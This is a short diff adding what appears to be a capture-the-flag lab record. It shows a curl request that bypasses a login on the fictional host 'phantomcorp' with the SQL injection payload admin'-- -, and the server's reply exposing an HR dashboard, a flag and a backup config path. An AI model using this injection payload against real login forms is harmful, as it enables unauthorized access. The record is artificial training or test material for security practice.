@@ -1,0 +1,11 @@
+$ curl -s -i -X POST http://phantomcorp/portal/login --data "user=admin'-- -&pass=loquesea"
+
+HTTP/1.0 200 OK
+Server: PhantomClientes/2.0 
+Date: Wed, 18 Nov 2026 20:53:00 GMT
+Content-Type: text/plain
+
+Bienvenido admin. Dashboard RRHH.
+FLAG{final_sqli_foothold}
+Backup de config disponible en: /backup/rrhh.conf
+
